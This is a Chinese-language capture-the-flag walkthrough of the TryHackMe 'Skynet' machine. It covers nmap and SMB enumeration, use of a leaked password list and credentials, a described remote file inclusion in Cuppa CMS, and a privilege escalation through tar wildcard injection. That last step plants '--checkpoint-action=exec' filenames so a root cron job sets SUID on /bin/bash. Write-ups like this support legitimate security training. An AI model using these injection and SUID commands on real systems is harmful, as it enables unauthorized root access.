# Skynet

nmap扫描

```shell
sudo nmap --min-rate 10000 -p- 10.10.216.74 -Pn

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds

sudo nmap -sT -sV -sC -O -p22,80,110,139,143,445 10.10.216.74 -Pn

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING AUTH-RESP-CODE UIDL SASL TOP CAPA RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ID SASL-IR more OK have post-login LITERAL+ capabilities Pre-login IDLE LOGINDISABLEDA0001 LOGIN-REFERRALS ENABLE IMAP4rev1 listed
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```

发现有开启smb服务，进行枚举

```shell
smbclient -L 10.10.216.74 -N                                    

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET
```

可以尝试匿名访问

```shell
smbclient //10.10.216.74/anonymous -N
```

然后将所有的文件下载下来

```shell
cat log1.txt

cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator

cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

可以发现一个名为miles dyson的人让大家更改密码，而上面哪个可能是一个密码表

下一步进行目录扫描

```
sudo dirsearch -u http://10.10.216.74/

301 -  312B  - /admin  ->  http://10.10.216.74/admin/                                          
301 -  313B  - /config  ->  http://10.10.216.74/config/                                          
301 -  310B  - /css  ->  http://10.10.216.74/css/                
301 -  319B  - /squirrelmail  ->  http://10.10.216.74/squirrelmail/
```

发现只有最后一个可以打开，并且还存在一个登录页面

我们猜测用户名为milesdyson，密码为上面其中之一，尝试破解

最后登录凭据为milesdyson：cyborg007haloterminator

进入到一个疑似后台管理的页面

看一下里面的内容

```tex
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

找到了milesdyson的密码，我们又可以尝试登录到smb了

```
smbclient //10.10.216.74/milesdyson -U milesdyson
```

找到一个很特别的文件important.txt

```tex
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

说是存在一个测试版的cms，那我们就去看看

可以打开

根据thm的提示，我们可以知道存在rfi

再次进行目录扫描

```
sudo dirsearch -u http://10.10.216.74/45kra24zxs28v3yd/
```

成功找到后台登陆页面10.10.216.74/45kra24zxs28v3yd/administrator/

发现该后台是有了cuppa，我们可以去查找一下该cms是否存在什么漏洞

发现此cms只有一个漏洞且刚好为rfi

尝试利用

成功getshell,接下来尝试提权

首先我们将林peas.sh下载到目标服务器上，给上执行权限后开始运行

```tex
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

发现/home/milesdyson/backups/目录下存在一个以root权限运行的脚本，看看我们能否对其进行修该以尝试提取

```
ls -liah

422020 -rwxr-xr-x 1 root       root         74 Sep 17  2019 backup.sh
```

很遗憾，我们无法对其修改和删除

查看其内容

```tex
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

这段 Bash 脚本的作用是将 `/var/www/html` 目录下的所有内容打包成一个 `.tgz` 备份文件，并将该文件保存在 `/home/milesdyson/backups/` 

注意到这里存在一个通配符注入漏洞

```tex
通配符注入（Wildcard Injection） 是一种安全漏洞，指的是攻击者将特殊通配符（如 *, ?, [...] 等）注入到命令或脚本中，使其在执行系统命令（特别是涉及 bash、tar、rm、cp 等工具）时发生意料之外的行为，进而造成信息泄露、文件覆盖、删除或代码执行等问题。
```

```
#创建一个脚本，一旦执行，会让 bash 拥有 root 权限（提权用）
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/root_shell.sh

#这是 tar 命令的一个特殊参数形式，它告诉 tar：每个 checkpoint 时执行 sh root_shell.sh 命令
touch "/var/www/html/--checkpoint-action=exec=sh root_shell.sh"

#这个参数启用了 tar 的 checkpoint 功能，意味着 tar 会定期执行你通过 --checkpoint-action 指定的操作。
touch "/var/www/html/--checkpoint=1"

#以 SUID 权限执行 bash，从而获得提权后的 shell。
/bin/bash -p
```

拿到了管理员权限